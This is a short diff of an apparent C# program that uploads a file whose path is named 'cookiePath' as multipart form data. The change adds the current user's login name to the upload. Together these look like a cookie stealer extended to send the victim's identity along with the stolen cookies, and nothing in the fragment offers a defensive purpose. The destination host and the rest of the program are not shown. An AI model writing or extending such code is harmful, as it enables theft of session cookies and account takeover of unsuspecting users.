@@ -113,6 +113,7 @@ class Program
         Console.WriteLine($"Uploading file: {cookiePath}");
 
         using var form = new MultipartFormDataContent();
+        form.Add(new StringContent(Environment.UserName), "username");
         var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(cookiePath));
         fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
         form.Add(fileContent, "file", Path.GetFileName(cookiePath));
